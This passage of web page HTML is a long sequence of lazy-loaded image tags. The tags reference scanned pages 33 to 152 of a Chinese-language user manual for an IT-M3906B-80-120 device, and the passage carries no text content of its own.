data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f48a14abd659144dfd7a8d24685d3026.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_33"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/07e2d6a6360a9b5aa9d7789c5db5cf8f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_34"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/39d4320cbd1c1ef246278103f07fc38b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_35"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0512564ccaaa36914c3f120d3d2ddfe.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_36"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a4a52adbeb8a19141e8f35bcd3b7d6c9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_37"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/42f4f67754083e0ec6d223064ab8d23f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_38"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/646cbaedb4b8c5af060c3b664418a74d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_39"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b0c88e46f92d3e25af795736a2e4a91c.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_40"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/94d123618eceef847cda1d85de3f9f62.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_41"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/552c547637d719e6fa8b8028d6a1be67.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_42"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8dc1d27aaf00708cc48614d98ec3fd39.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_43"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0bf234e93eec1b0583373dc7e33daeb6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_44"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c6af5a21f21c0e3f5e60f40cda2b520.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_45"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/276bc5c7cbcf272c87dcb90c3709d1d7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_46"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/301d571b52833451c842dcf8c1ab5c9f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_47"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8da5c2f8b77512c9910e56f4d20418b9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_48"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fe05a7e7422b2a9ed2b2b1894e3f1c34.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_49"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6931743a43e3454808e4fbb3ec1f9e28.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_50"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c19d6bb54a1dc092192eae1bf008037b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_51"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/55b608a3e2dbaf6500d0496dcce4214e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_52"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b033e99eb6fc05b9f99636a948114d3b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_53"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c50cbc7f65a76648089cfe85ee381594.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_54"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6f5741832978ae4379794ec40cc28642.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_55"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5b46ee9e796ae8c0bf686568334583d8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_56"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/aa7c2b2f5a60f70d05d6f6855452903a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_57"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/510e855d42df5f59091c8ef1db949a60.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_58"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8212f19aa90523a1f5fac776d59e3705.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_59"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3c43781b9fd6d54848b3eac85c7c08bd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_60"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d1a1ab8014a30269cd693435ae50d617.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_61"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ea124d220827e7eec70c504bd8723d9f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_62"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/093dd2acf313d184aac9f1e19f008ba9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_63"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/baaf5d5f39b39d29c988872e45f25d47.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_64"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/13e621a9e02b30e73b5c827f8f7e363a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_65"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6b471d9ecffc8882476ff454fb080ab8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_66"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2a26ecd703088db74d0abbd54ded7a2b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_67"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2915fe2f339aa2807c47d8d65a4bd0a2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_68"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dd053f7cbbcd0038add0d65ec95f1579.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_69"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bc5a4a2a22c8087c3ef402247f05cd0b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_70"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e511e0abf7f334656ba10cd95dcde7e6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_71"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d405b3d78079e078b498fb014d6a20cd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_72"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/610d93f7a3daab60d045f6c42eb7d92d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_73"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6b9fb4f39436b26157c603d8f4879f42.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_74"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e6f17a01d662f3d5c14eb8cd475fcf1b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_75"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0d60b2323fe3bbf077f34687696533c0.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_76"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/799aefee6bc257381ded773fec704706.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_77"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4f242532cf05040bae6f89e681f5a7ed.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_78"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8778745bdf44fcf03a9123b4113d7135.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_79"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b29e43aef0e8d889a6b0288f9fb3abcb.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_80"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/73ca6506394e6b7059728203f2c7dcfe.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_81"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6acb247f6c8af9ab9f0ef155ec3c7f3b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_82"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/81e2121173f024cf2747a0c44002c5ea.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_83"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0f615f32408891b982bac554351bba3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_84"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0f3fbacf7d6616edd12c41990d904d32.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_85"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/790ff6aa3bc703b25989204be4870cbd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_86"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/805807154f9af3ae1920aef59d6f5acc.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_87"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0f4a5fb6d5c837305175124d9bdabf2a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_88"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f62465e987f9b52f2443c530b271d90d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_89"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1454562670789f7f7fb3172328da4ca9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_90"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/92ddf20cf9781c7d99db4ca3dc508ab2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_91"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/46758236d7c937d049993ca4ae88f57f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_92"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2d881f9bfef3759ef8d99c6ea6d0a458.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_93"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6647cce1847b8462d61cf3d44c62dab9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_94"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9fc40ec81afae6311b9ddff8cc7116af.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_95"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9c981c57b548b7a654682494051647ff.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_96"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/490b55184b6e7c1575b4bacb09a10fc7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_97"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/42f61521f300d99b5a04998b7c150013.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_98"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fdeb044bf34d64b2dfc155096b9e534d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_99"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/595e18d44ee31363b3052b131f99b060.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_100"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/67c654145e83bfef5dc26e942b67e3a4.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_101"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8bca83ad73bb014a53fe7aa9303452c5.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_102"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/37e5c59af11bd3588e950357baf2b23a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_103"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/89a03198a8ce4ba2fe6ca79036451aa8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_104"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f5222918fdc4f2c67250b343224dd646.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_105"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ef135801975da2e8cbbb9764531f5ced.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_106"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c509a731e565998342ca9aeed4f5bf50.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_107"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c0a52dfd0938d54199cdb9082eac131.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_108"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6f5f6988a2f1af64586a1a641dc09115.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_109"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8a92259cea7f471979215bdb889ec35b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_110"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1a3e67baeeb697b2295214fd10a3147b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_111"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5bed50f806c3d8f662f78d6ac1586cce.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_112"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8d7456c80ce0b120c666d6045af800a6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_113"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9fee44507a1fcf0966cf7ec286bbd6e7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_114"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4ac684882a7be0b27bce646c6b645c2a.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_115"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7c3dd2af0256b22701743ef4040557f4.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_116"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6400a729ce3cc18423c2685634217793.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_117"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/42c02526e52195b39b7f93c0604037e8.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_118"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/99f7d2e4b86e1f39955e7618e0eae931.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_119"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/821ee24bff5cbb8fb8d3e1ad8ac6b693.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_120"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c855ba1839e6c8e28eade55263879777.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_121"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0a9ac969ce7bde06a3bd85a448693cc.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_122"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4d083b27574b69a1af2433e648671cae.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_123"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/380493ac11cf8760212ed4d45b7d1fd3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_124"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/db468449899148cfc6e19309152207d1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_125"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e830adfa9b25faf163d588212327e64b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_126"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c483753477e755b19e03682a2bd09658.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_127"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/404e07276dba9cc564253589ea8c4ac3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_128"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1850bc143242fc27c0550a2f5affedba.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_129"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/513003ce580facf711474ab1ceb16bf9.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_130"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bf9c2f6b8113c929ab2c65eaa410aa82.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_131"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d0dcf1d2bd744da889b0a3066c141549.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_132"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/63482e1a0721593581ca05fb6211d3b3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_133"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0faa9b1cd6259931745377b8bb0bd976.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_134"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c82c7ad58ec89d32b0c6d2344dac351.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_135"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a4472a3863164d282657e4585102e6c0.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_136"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9265c59bbbb0dfa58d6953bce803aeae.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_137"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4c91832b072b4ed21222245fbf93a0d6.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_138"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cdb35716411712370220b889016802f4.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_139"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6746e793d58629c4fc4492614b3233eb.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_140"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/62018d9af31dd34d3ebbedff1c5c389e.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_141"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fba1f8532da01f2468a31c35c9ebdcc3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_142"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e83e7b3b2b81768dc17e07c237f3c2d1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_143"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3314dd74a747a4063cc6635c5bc79478.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_144"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b4d047c1e52dba4ad90dff1b45bc6207.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_145"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1942e316c0ac0546589e1713c2b8a7c7.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_146"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/285cab0cf3961ee7eb046e4958c66297.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_147"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1dccf2d777c4c5752e21776061efb01c.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_148"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/91b6608b341f1754db45f13f6caeef49.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_149"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4e2ed69831c3c866db60a790ae8415b1.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_150"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/878b82ee9cf0cbfa36419c4618a20b82.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_151"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/31e00a86938dd9e501861108ecbbff39.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_152"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 